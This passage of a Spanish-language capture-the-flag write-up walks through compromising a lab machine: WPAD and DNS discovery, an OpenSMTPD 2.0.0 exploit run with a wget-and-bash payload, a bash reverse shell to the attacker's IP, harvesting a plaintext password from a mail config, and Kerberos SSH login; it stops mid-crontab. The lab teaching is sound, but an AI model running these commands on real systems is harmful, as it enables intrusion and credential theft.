<span class=line></span></code></pre><p>al conectarnos a wpad.realcorp.htb, obtenemos un 403 Prohibido.</p><h3 id=investigacion-de-wpad>Investigacion de WPAD<a href=#investigacion-de-wpad class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h3><p>Al investigar cómo funciona WPAD, encontré esta página web que dice lo siguiente:</p><p><a href=https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks>https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks</a></p><p>“Muchos navegadores utilizan el descubrimiento automático de proxy web (WPAD) para cargar la configuración del proxy desde la red. Un servidor WPAD proporciona configuraciones de proxy del cliente a través de una URL particular (por ejemplo, <a href=http://wpad.example.org/wpad.dat)%E2%80%A6%E2%80%9D>http://wpad.example.org/wpad.dat)…”</a></p><p>Intentemos obtener este archivo wpad.dat del servidor.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>proxychains</span><span style=color:#79b8ff> -q</span><span style=color:#9ecbff> curl</span><span style=color:#9ecbff> wpad.realcorp.htb/wpad.dat</span></span>
<span class=line><span style=color:#f97583>function</span><span style=color:#b392f0> FindProxyForURL</span><span style=color:#e1e4e8>(</span><span style=color:#b392f0>url,</span><span style=color:#9ecbff> host</span><span style=color:#e1e4e8>) {</span></span>
<span class=line><span style=color:#f97583>    if</span><span style=color:#e1e4e8> (</span><span style=color:#b392f0>dnsDomainIs(host,</span><span style=color:#9ecbff> "realcorp.htb"</span><span style=color:#e1e4e8>))</span></span>
<span class=line><span style=color:#f97583>        return</span><span style=color:#9ecbff> "DIRECT"</span><span style=color:#e1e4e8>;</span></span>
<span class=line><span style=color:#f97583>    if</span><span style=color:#e1e4e8> (</span><span style=color:#b392f0>isInNet(dnsResolve(host</span><span style=color:#e1e4e8>)</span><span style=color:#b392f0>,</span><span style=color:#9ecbff> "10.197.243.0",</span><span style=color:#9ecbff> "255.255.255.0"</span><span style=color:#e1e4e8>))</span></span>
<span class=line><span style=color:#f97583>        return</span><span style=color:#9ecbff> "DIRECT"</span><span style=color:#e1e4e8>; </span></span>
<span class=line><span style=color:#f97583>    if</span><span style=color:#e1e4e8> (</span><span style=color:#b392f0>isInNet(dnsResolve(host</span><span style=color:#e1e4e8>)</span><span style=color:#b392f0>,</span><span style=color:#9ecbff> "10.241.251.0",</span><span style=color:#9ecbff> "255.255.255.0"</span><span style=color:#e1e4e8>))</span></span>
<span class=line><span style=color:#f97583>        return</span><span style=color:#9ecbff> "DIRECT"</span><span style=color:#e1e4e8>; </span></span>
<span class=line><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#f97583>    return</span><span style=color:#9ecbff> "PROXY proxy.realcorp.htb:3128"</span><span style=color:#e1e4e8>;</span></span>
<span class=line><span style=color:#e1e4e8>}</span></span>
<span class=line></span></code></pre><p>Al observar el archivo wpad.dat, podemos ver que hay otra subred previamente desconocida <code>10.241.251.0/24</code>.</p><p>Podemos usar nslookup para hacerlo.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>man</span><span style=color:#9ecbff> nslookup</span></span>
<span class=line><span style=color:#b392f0>DESCRIPTION</span></span>
<span class=line><span style=color:#b392f0>	Nslookup</span><span style=color:#9ecbff> is</span><span style=color:#9ecbff> a</span><span style=color:#9ecbff> program</span><span style=color:#9ecbff> to</span><span style=color:#9ecbff> query</span><span style=color:#9ecbff> Internet</span><span style=color:#9ecbff> domain</span><span style=color:#9ecbff> name</span><span style=color:#9ecbff> servers.</span><span style=color:#9ecbff>  Nslookup</span><span style=color:#9ecbff> has</span><span style=color:#9ecbff> two</span><span style=color:#9ecbff> modes:</span><span style=color:#9ecbff> interactive</span><span style=color:#9ecbff> and</span></span>
<span class=line><span style=color:#b392f0>    non-interactive.</span><span style=color:#e1e4e8> [...] Non-interactive mode is used to print just the name and requested information </span><span style=color:#f97583>for</span><span style=color:#e1e4e8> a host or domain.</span></span>
<span class=line><span style=color:#e1e4e8>[...]</span></span>
<span class=line><span style=color:#b392f0>RETURN</span><span style=color:#9ecbff> VALUES</span></span>
<span class=line><span style=color:#b392f0>    nslookup</span><span style=color:#9ecbff> returns</span><span style=color:#9ecbff> with</span><span style=color:#9ecbff> an</span><span style=color:#9ecbff> exit</span><span style=color:#9ecbff> status</span><span style=color:#9ecbff> of</span><span style=color:#79b8ff> 1</span><span style=color:#9ecbff> if</span><span style=color:#9ecbff> any</span><span style=color:#9ecbff> query</span><span style=color:#9ecbff> failed,</span><span style=color:#9ecbff> and</span><span style=color:#79b8ff> 0</span><span style=color:#9ecbff> otherwise.</span></span>
<span class=line></span></code></pre><p>Podemos usar la siguiente sintaxis para verificar si existe un host:</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>nslookup</span><span style=color:#9ecbff> 10.241.251.X</span><span style=color:#79b8ff> 10.10.10.224</span></span>
<span class=line></span></code></pre><p>Si el código de salida no es cero, el host no existe.</p><p>Podemos implementar esto con un script bash:</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#6a737d>#!/bin/bash</span></span>
<span class=line><span style=color:#e1e4e8>DNS_SERVER</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"10.10.10.224"</span></span>
<span class=line><span style=color:#e1e4e8>IP_RANGE</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"10.241.251"</span></span>
<span class=line></span>
<span class=line><span style=color:#f97583>for</span><span style=color:#e1e4e8> HOST </span><span style=color:#f97583>in</span><span style=color:#e1e4e8> $(</span><span style=color:#b392f0>seq</span><span style=color:#79b8ff> 1</span><span style=color:#79b8ff> 254</span><span style=color:#e1e4e8>);</span></span>
<span class=line><span style=color:#f97583> do</span></span>
<span class=line><span style=color:#e1e4e8>   IP</span><span style=color:#f97583>=</span><span style=color:#9ecbff>"</span><span style=color:#e1e4e8>$IP_RANGE</span><span style=color:#9ecbff>.</span><span style=color:#e1e4e8>$HOST</span><span style=color:#9ecbff>"</span></span>
<span class=line><span style=color:#b392f0>   nslookup</span><span style=color:#9ecbff> "</span><span style=color:#e1e4e8>$IP</span><span style=color:#9ecbff>"</span><span style=color:#e1e4e8> $DNS_SERVER </span><span style=color:#f97583>1>&#x26;2></span><span style=color:#9ecbff>/dev/null</span><span style=color:#6a737d> # Try to resolve IP to a hostname</span></span>
<span class=line><span style=color:#f97583>   if</span><span style=color:#e1e4e8> [[ </span><span style=color:#79b8ff>$?</span><span style=color:#f97583> -eq</span><span style=color:#79b8ff> 0</span><span style=color:#e1e4e8> ]]; </span><span style=color:#6a737d># If nslookup exited with 0, the query was successful = host found</span></span>
<span class=line><span style=color:#f97583>    then</span></span>
<span class=line><span style=color:#79b8ff>       echo</span><span style=color:#9ecbff> "Host (</span><span style=color:#e1e4e8>$IP</span><span style=color:#9ecbff>) found via DNS:"</span></span>
<span class=line><span style=color:#b392f0>       nslookup</span><span style=color:#9ecbff> "</span><span style=color:#e1e4e8>$IP</span><span style=color:#9ecbff>"</span><span style=color:#e1e4e8> $DNS_SERVER </span><span style=color:#6a737d># Print info</span></span>
<span class=line><span style=color:#f97583>    fi</span></span>
<span class=line><span style=color:#f97583> done</span></span>
<span class=line></span></code></pre><p>Ejecutemos el script y veamos si se puede encontrar algún host.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>./dns-scan.sh</span><span style=color:#e1e4e8> </span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>Host</span><span style=color:#e1e4e8> (10.241.251.113) found via DNS:</span></span>
<span class=line><span style=color:#b392f0>113.251.241.10.in-addr.arpa</span><span style=color:#9ecbff>     name</span><span style=color:#9ecbff> =</span><span style=color:#9ecbff> srvpod01.realcorp.htb.</span></span>
<span class=line></span></code></pre><p>Encontramos con éxito un host: 10.241.251.113 (srvpod01.realcorp.htb). Usemos nmap para encontrar cualquier puerto abierto.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>proxychains</span><span style=color:#79b8ff> -q</span><span style=color:#9ecbff> nmap</span><span style=color:#79b8ff> -sT</span><span style=color:#79b8ff> -Pn</span><span style=color:#79b8ff> -n</span><span style=color:#79b8ff> -v</span><span style=color:#79b8ff> 10.241.251.113</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>Discovered</span><span style=color:#9ecbff> open</span><span style=color:#9ecbff> port</span><span style=color:#9ecbff> 25/tcp</span><span style=color:#9ecbff> on</span><span style=color:#79b8ff> 10.241.251.113</span></span>
<span class=line></span></code></pre><p>Parece que el puerto <code>25 (SMTP)</code> está abierto en el host.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>proxychains</span><span style=color:#79b8ff> -q</span><span style=color:#9ecbff> nmap</span><span style=color:#79b8ff> -sT</span><span style=color:#79b8ff> -Pn</span><span style=color:#79b8ff> -n</span><span style=color:#79b8ff> -sC</span><span style=color:#79b8ff> -sV</span><span style=color:#79b8ff> -p</span><span style=color:#79b8ff> 25</span><span style=color:#79b8ff> 10.241.251.113</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#b392f0>Nmap</span><span style=color:#9ecbff> scan</span><span style=color:#9ecbff> report</span><span style=color:#9ecbff> for</span><span style=color:#79b8ff> 10.241.251.113</span></span>
<span class=line><span style=color:#b392f0>Host</span><span style=color:#9ecbff> is</span><span style=color:#9ecbff> up</span><span style=color:#e1e4e8> (0.19s </span><span style=color:#9ecbff>latency</span><span style=color:#e1e4e8>).</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>PORT</span><span style=color:#9ecbff>   STATE</span><span style=color:#9ecbff> SERVICE</span><span style=color:#9ecbff> VERSION</span></span>
<span class=line><span style=color:#b392f0>25/tcp</span><span style=color:#9ecbff> open</span><span style=color:#9ecbff>  smtp</span><span style=color:#9ecbff>    OpenSMTPD</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> smtp-commands:</span><span style=color:#9ecbff> smtp.realcorp.htb</span><span style=color:#9ecbff> Hello</span><span style=color:#9ecbff> nmap.scanme.org</span><span style=color:#e1e4e8> [10.241.251.1], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP, </span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>_</span><span style=color:#79b8ff> 2.0.0</span><span style=color:#9ecbff> This</span><span style=color:#9ecbff> is</span><span style=color:#9ecbff> OpenSMTPD</span><span style=color:#79b8ff> 2.0.0</span><span style=color:#9ecbff> To</span><span style=color:#9ecbff> report</span><span style=color:#9ecbff> bugs</span><span style=color:#9ecbff> in</span><span style=color:#9ecbff> the</span><span style=color:#9ecbff> implementation,</span><span style=color:#9ecbff> please</span><span style=color:#9ecbff> contact</span><span style=color:#9ecbff> bugs@openbsd.org</span><span style=color:#79b8ff> 2.0.0</span><span style=color:#9ecbff> with</span><span style=color:#9ecbff> full</span><span style=color:#9ecbff> details</span><span style=color:#79b8ff> 2.0.0</span><span style=color:#9ecbff> End</span><span style=color:#9ecbff> of</span><span style=color:#9ecbff> HELP</span><span style=color:#9ecbff> info</span></span>
<span class=line></span></code></pre><p>Parece que el nombre de host del servidor es <code>smtp.realcorp.htb</code> y está ejecutando <code>OpenSMTPD (Versión 2.0.0)</code>. Agreguemos el host a nuestro archivo <code>/etc/hosts</code>:</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>sudo</span><span style=color:#9ecbff> nano</span><span style=color:#9ecbff> /etc/hosts</span></span>
<span class=line><span style=color:#b392f0>10.10.10.224</span><span style=color:#9ecbff>    srv01.realcorp.htb</span></span>
<span class=line><span style=color:#b392f0>10.197.243.31</span><span style=color:#9ecbff>   wpad.realcorp.htb</span></span>
<span class=line><span style=color:#b392f0>10.197.243.77</span><span style=color:#9ecbff>   ns.realcorp.htb</span><span style=color:#9ecbff> proxy.realcorp.htb</span></span>
<span class=line><span style=color:#b392f0>10.241.251.113</span><span style=color:#9ecbff>  smtp.realcorp.htb</span></span>
<span class=line></span></code></pre><p>busquemos un exploit para OpenSMTPD v2.0.0.</p><h1 id=explotation><span style=color:#33acff>Explotation</span><a href=#explotation class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h1><p>Buscando en google encontramos un exploit: <a href=https://www.exploit-db.com/exploits/47984>https://www.exploit-db.com/exploits/47984</a></p><p>Vamos a enviarnos una revshell:</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>nc</span><span style=color:#79b8ff> -nlvp</span><span style=color:#79b8ff> 1234</span></span>
<span class=line></span></code></pre><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#79b8ff>echo</span><span style=color:#9ecbff> 'bash -c "bash -i >&#x26; /dev/tcp/10.10.14.11/1234 0>&#x26;1"'</span><span style=color:#f97583> ></span><span style=color:#9ecbff> /var/www/html/index.html</span></span>
<span class=line></span></code></pre><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>sudo</span><span style=color:#9ecbff> service</span><span style=color:#9ecbff> apache2</span><span style=color:#9ecbff> start</span></span>
<span class=line></span></code></pre><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>proxychains</span><span style=color:#9ecbff> python3</span><span style=color:#9ecbff> 47984.py</span><span style=color:#79b8ff> 10.241.251.113</span><span style=color:#79b8ff> 25</span><span style=color:#9ecbff> 'wget 10.10.14.11;bash index.html'</span></span>
<span class=line></span></code></pre><p>Ya tenenos la shell.</p><h1 id=lateral-movement><span style=color:#33acff>Lateral Movement</span><a href=#lateral-movement class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h1><p>Comencemos enumerando todos los usuarios de la máquina:</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>root@smtp:/home#</span><span style=color:#9ecbff> ls</span><span style=color:#79b8ff> -alh</span></span>
<span class=line><span style=color:#b392f0>total</span><span style=color:#79b8ff> 0</span></span>
<span class=line><span style=color:#b392f0>drwxr-xr-x.</span><span style=color:#79b8ff> 1</span><span style=color:#9ecbff> root</span><span style=color:#9ecbff>       root</span><span style=color:#79b8ff>       24</span><span style=color:#9ecbff> Dec</span><span style=color:#79b8ff>  8</span><span style=color:#9ecbff> 10:56</span><span style=color:#9ecbff> .</span></span>
<span class=line><span style=color:#b392f0>drwxr-xr-x.</span><span style=color:#79b8ff> 1</span><span style=color:#9ecbff> root</span><span style=color:#9ecbff>       root</span><span style=color:#79b8ff>       96</span><span style=color:#9ecbff> Dec</span><span style=color:#79b8ff>  8</span><span style=color:#9ecbff> 18:50</span><span style=color:#9ecbff> ..</span></span>
<span class=line><span style=color:#b392f0>drwxr-xr-x.</span><span style=color:#79b8ff> 1</span><span style=color:#9ecbff> j.nakazawa</span><span style=color:#9ecbff> j.nakazawa</span><span style=color:#79b8ff> 59</span><span style=color:#9ecbff> Dec</span><span style=color:#79b8ff>  9</span><span style=color:#9ecbff> 12:31</span><span style=color:#9ecbff> j.nakazawa</span></span>
<span class=line></span></code></pre><p>Parece que el único usuario de este sistema es <code>j.nakazawa</code>. Echemos un vistazo a su carpeta de inicio.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>root@smtp:/home/j.nakazawa#</span><span style=color:#9ecbff> ls</span><span style=color:#79b8ff> -alh</span></span>
<span class=line><span style=color:#b392f0>total</span><span style=color:#9ecbff> 16K</span></span>
<span class=line><span style=color:#b392f0>drwxr-xr-x.</span><span style=color:#79b8ff> 1</span><span style=color:#9ecbff> j.nakazawa</span><span style=color:#9ecbff> j.nakazawa</span><span style=color:#79b8ff>   59</span><span style=color:#9ecbff> Dec</span><span style=color:#79b8ff>  9</span><span style=color:#9ecbff> 12:31</span><span style=color:#9ecbff> .</span></span>
<span class=line><span style=color:#b392f0>drwxr-xr-x.</span><span style=color:#79b8ff> 1</span><span style=color:#9ecbff> root</span><span style=color:#9ecbff>       root</span><span style=color:#79b8ff>         24</span><span style=color:#9ecbff> Dec</span><span style=color:#79b8ff>  8</span><span style=color:#9ecbff> 10:56</span><span style=color:#9ecbff> ..</span></span>
<span class=line><span style=color:#b392f0>lrwxrwxrwx.</span><span style=color:#79b8ff> 1</span><span style=color:#9ecbff> root</span><span style=color:#9ecbff>       root</span><span style=color:#79b8ff>          9</span><span style=color:#9ecbff> Dec</span><span style=color:#79b8ff>  9</span><span style=color:#9ecbff> 12:31</span><span style=color:#9ecbff> .bash_history</span><span style=color:#e1e4e8> -</span><span style=color:#f97583>></span><span style=color:#9ecbff> /dev/null</span></span>
<span class=line><span style=color:#b392f0>-rw-r--r--.</span><span style=color:#79b8ff> 1</span><span style=color:#9ecbff> j.nakazawa</span><span style=color:#9ecbff> j.nakazawa</span><span style=color:#79b8ff>  220</span><span style=color:#9ecbff> Apr</span><span style=color:#79b8ff> 18</span><span style=color:#79b8ff>  2019</span><span style=color:#9ecbff> .bash_logout</span></span>
<span class=line><span style=color:#b392f0>-rw-r--r--.</span><span style=color:#79b8ff> 1</span><span style=color:#9ecbff> j.nakazawa</span><span style=color:#9ecbff> j.nakazawa</span><span style=color:#9ecbff> 3.5K</span><span style=color:#9ecbff> Apr</span><span style=color:#79b8ff> 18</span><span style=color:#79b8ff>  2019</span><span style=color:#9ecbff> .bashrc</span></span>
<span class=line><span style=color:#b392f0>-rw-------.</span><span style=color:#79b8ff> 1</span><span style=color:#9ecbff> j.nakazawa</span><span style=color:#9ecbff> j.nakazawa</span><span style=color:#79b8ff>  476</span><span style=color:#9ecbff> Dec</span><span style=color:#79b8ff>  8</span><span style=color:#9ecbff> 19:12</span><span style=color:#9ecbff> .msmtprc</span></span>
<span class=line><span style=color:#b392f0>-rw-r--r--.</span><span style=color:#79b8ff> 1</span><span style=color:#9ecbff> j.nakazawa</span><span style=color:#9ecbff> j.nakazawa</span><span style=color:#79b8ff>  807</span><span style=color:#9ecbff> Apr</span><span style=color:#79b8ff> 18</span><span style=color:#79b8ff>  2019</span><span style=color:#9ecbff> .profile</span></span>
<span class=line><span style=color:#b392f0>lrwxrwxrwx.</span><span style=color:#79b8ff> 1</span><span style=color:#9ecbff> root</span><span style=color:#9ecbff>       root</span><span style=color:#79b8ff>          9</span><span style=color:#9ecbff> Dec</span><span style=color:#79b8ff>  9</span><span style=color:#9ecbff> 12:31</span><span style=color:#9ecbff> .viminfo</span><span style=color:#e1e4e8> -</span><span style=color:#f97583>></span><span style=color:#9ecbff> /dev/null</span></span>
<span class=line></span></code></pre><p>Detectamos un archivo interesante en la carpeta de inicio del usuario: .msmtprc. Este es un archivo de configuración para usar el cliente SMTP. Comprobemos posibles contraseñas.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>root@smtp:/home/j.nakazawa#</span><span style=color:#9ecbff> cat</span><span style=color:#9ecbff> .msmtprc</span></span>
<span class=line><span style=color:#6a737d># Set default values for all following accounts.</span></span>
<span class=line><span style=color:#b392f0>defaults</span></span>
<span class=line><span style=color:#b392f0>auth</span><span style=color:#9ecbff>           on</span></span>
<span class=line><span style=color:#b392f0>tls</span><span style=color:#9ecbff>            on</span></span>
<span class=line><span style=color:#b392f0>tls_trust_file</span><span style=color:#9ecbff> /etc/ssl/certs/ca-certificates.crt</span></span>
<span class=line><span style=color:#b392f0>logfile</span><span style=color:#9ecbff>        /dev/null</span></span>
<span class=line></span>
<span class=line><span style=color:#6a737d># RealCorp Mail</span></span>
<span class=line><span style=color:#b392f0>account</span><span style=color:#9ecbff>        realcorp</span></span>
<span class=line><span style=color:#b392f0>host</span><span style=color:#79b8ff>           127.0.0.1</span></span>
<span class=line><span style=color:#b392f0>port</span><span style=color:#79b8ff>           587</span></span>
<span class=line><span style=color:#b392f0>from</span><span style=color:#9ecbff>           j.nakazawa@realcorp.htb</span></span>
<span class=line><span style=color:#b392f0>user</span><span style=color:#9ecbff>           j.nakazawa</span></span>
<span class=line><span style=color:#b392f0>password</span><span style=color:#9ecbff>       sJB}R</span><span style=color:#e1e4e8>M</span><span style=color:#f97583>></span><span style=color:#9ecbff>6Z~64_</span></span>
<span class=line><span style=color:#b392f0>tls_fingerprint</span><span style=color:#9ecbff> C9:6A:B9:F6:0A:D4:9C:2B:B9:F6:44:1F:30:B8:5E:5A:D8:0D:A5:60</span></span>
<span class=line></span>
<span class=line><span style=color:#6a737d># Set a default account</span></span>
<span class=line><span style=color:#b392f0>account</span><span style=color:#9ecbff> default</span><span style=color:#9ecbff> :</span><span style=color:#9ecbff> realcorp</span></span>
<span class=line></span></code></pre><p>Obtenemos las credenciales para el usuario <code>j.nakazawa</code>:<code>sJB}RM6Z~64_</code></p><p>Intentemos iniciar sesión en el servidor principal a través de SSH.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>ssh</span><span style=color:#9ecbff> j.nakazawa@10.10.10.224</span></span>
<span class=line><span style=color:#b392f0>j.nakazawa@10.10.10.224</span><span style=color:#9ecbff> password:</span><span style=color:#9ecbff> sJB}R</span><span style=color:#e1e4e8>M</span><span style=color:#f97583>></span><span style=color:#9ecbff>6Z~64_</span></span>
<span class=line><span style=color:#b392f0>Permission</span><span style=color:#9ecbff> denied,</span><span style=color:#9ecbff> please</span><span style=color:#9ecbff> try</span><span style=color:#9ecbff> again.</span></span>
<span class=line></span></code></pre><p>Parece que esto no funciona. Sin embargo, el mensaje de error me llama la atención. Nunca antes había visto gssapi-keyex ni gssapi-with-mic. Empecemos a investigar.</p><h2 id=investigando-la-autenticación-ssh-usando-gssapi>Investigando la autenticación SSH usando gssapi<a href=#investigando-la-autenticación-ssh-usando-gssapi class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h2><p>Después de buscar esto por un tiempo, encontré esta respuesta en serverfault: <a href=https://serverfault.com/questions/75362/what-is-gssapi-with-mic/1041704#1041704>https://serverfault.com/questions/75362/what-is-gssapi-with-mic/1041704#1041704</a></p><p>que habla de que está relacionada con Kerberos. Esto tendría sentido ya que hay varios puertos abiertos relacionados con Kerberos. Continuaremos nuestra investigación para que SSH utilice Kerberos.</p><p>Finalmente, encontré este documento de AWS: <a href=https://docs.aws.amazon.com/en_us/emr/latest/ManagementGuide/emr-kerberos-connect-ssh.html>https://docs.aws.amazon.com/en_us/emr/latest/ManagementGuide/emr-kerberos-connect-ssh.html</a></p><p>que parece describir bastante bien nuestro escenario. Esto indica que tenemos que configurar el archivo /etc/krb5.conf, ejecutar kinit y luego usar ssh -K.</p><h2 id=configuración-de-la-autenticación-kerberos>Configuración de la autenticación Kerberos<a href=#configuración-de-la-autenticación-kerberos class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h2><p>Ok, comencemos configurando <code>/etc/krb5.conf</code>, para esto primero tenemos que instalar <code>krb5-user</code> (apt install krb5-user).</p><p>El archivo <code>/etc/krb5.conf</code> debería tener el siguiente aspecto:</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>cat</span><span style=color:#9ecbff> /etc/krb5.conf</span></span>
<span class=line><span style=color:#e1e4e8>[libdefaults]</span></span>
<span class=line><span style=color:#b392f0>        default_realm</span><span style=color:#9ecbff> =</span><span style=color:#9ecbff> REALCORP.HTB</span><span style=color:#6a737d> # Change default realm</span></span>
<span class=line><span style=color:#e1e4e8>        </span></span>
<span class=line><span style=color:#e1e4e8>        [...]</span></span>
<span class=line></span>
<span class=line><span style=color:#e1e4e8>[realms]</span></span>
<span class=line><span style=color:#6a737d>		# Add realm</span></span>
<span class=line><span style=color:#b392f0>        REALCORP.HTB</span><span style=color:#9ecbff> =</span><span style=color:#9ecbff> {</span></span>
<span class=line><span style=color:#b392f0>                kdc</span><span style=color:#9ecbff> =</span><span style=color:#79b8ff> 10.10.10.224</span></span>
<span class=line><span style=color:#e1e4e8>        }</span></span>
<span class=line></span>
<span class=line></span></code></pre><p>Configuramos la hora, con la hora de la maquina victima:</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>ntpdate</span><span style=color:#79b8ff> 10.10.10.224</span></span>
<span class=line></span></code></pre><p>Ahora deberíamos ejecutar kinit con nuestro usuario.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>kinit</span><span style=color:#9ecbff> j.nakazawa</span></span>
<span class=line><span style=color:#b392f0>Password</span><span style=color:#9ecbff> for</span><span style=color:#9ecbff> j.nakazawa@REALCORP.HTB:</span><span style=color:#9ecbff> sJB}R</span><span style=color:#e1e4e8>M</span><span style=color:#f97583>></span><span style=color:#9ecbff>6Z~64_</span></span>
<span class=line></span></code></pre><p>Si tenemos éxito, deberíamos ver un ticket en el caché, si ejecutamos klist.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>klist</span></span>
<span class=line><span style=color:#b392f0>Ticket</span><span style=color:#9ecbff> cache:</span><span style=color:#9ecbff> FILE:/tmp/krb5cc_0</span></span>
<span class=line><span style=color:#b392f0>Default</span><span style=color:#9ecbff> principal:</span><span style=color:#9ecbff> j.nakazawa@REALCORP.HTB</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>Valid</span><span style=color:#9ecbff> starting</span><span style=color:#9ecbff>       Expires</span><span style=color:#9ecbff>              Service</span><span style=color:#9ecbff> principal</span></span>
<span class=line><span style=color:#b392f0>02/23/2021</span><span style=color:#9ecbff> 20:47:48</span><span style=color:#9ecbff>  02/24/2021</span><span style=color:#9ecbff> 20:41:46</span><span style=color:#9ecbff>  krbtgt/REALCORP.HTB@REALCORP.HTB</span></span>
<span class=line></span></code></pre><p>obtenemos un ticket válido que debería permitirnos ingresar mediante SSH a la máquina.</p><h2 id=ssh-using-kerberos>SSH using Kerberos<a href=#ssh-using-kerberos class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h2><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>ssh</span><span style=color:#9ecbff>  j.nakazawa@REALCORP.HTB</span></span>
<span class=line></span></code></pre><h1 id=lateral-movement-2><span style=color:#33acff>Lateral Movement #2</span><a href=#lateral-movement-2 class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h1><p>Veamos qué usuarios están en el sistema.</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#e1e4e8>[j.nakazawa@srv01 </span><span style=color:#f97583>~</span><span style=color:#e1e4e8>]$ cat /etc/passwd </span><span style=color:#f97583>|</span><span style=color:#b392f0> grep</span><span style=color:#9ecbff> "/bin/.*sh"</span></span>
<span class=line><span style=color:#b392f0>root:x:0:0:root:/root:/bin/bash</span></span>
<span class=line><span style=color:#b392f0>j.nakazawa:x:1000:1000::/home/j.nakazawa:/bin/bash</span></span>
<span class=line><span style=color:#b392f0>admin:x:1011:1011::/home/admin:/bin/bash</span></span>
<span class=line></span></code></pre><p>El administrador parece un objetivo interesante… Intentemos encontrar una manera de acceder al administrador.</p><p>Al observar los cronjobs, parece que el usuario administrador ejecuta un script cada minuto:</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#e1e4e8>[j.nakazawa@srv01 </span><span style=color:#f97583>~</span><span style=color:#e1e4e8>]$ cat /etc/crontab </span></span>
<span class=line><span style=color:#e1e4e8>SHELL</span><span style=color:#f97583>=</span><span style=color:#9ecbff>/bin/bash</span></span>
<span class=line><span style=color:#e1e4e8>PATH</span><span style=color:#f97583>=</span><span style=color:#9ecbff>/sbin:/bin:/usr/sbin:/usr/bin</span></span>
<span class=line><span style=color:#e1e4e8>MAILTO</span><span style=color:#f97583>=</span><span style=color:#9ecbff>root</span></span>
<span class=line></span>
<span class=line><span style=color:#6a737d># Example of job definition:</span></span>
<span class=line><span style=color:#6a737d># .---------------- minute (0 - 59)</span></span>
<span class=line><span style=color:#6a737d># |  .------------- hour (0 - 23)</span></span>
<span class=line><span style=color:#6a737d># |  |  .---------- day of month (1 - 31)</span></span>
<span class=line><span style=color:#6a737d># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span></span>
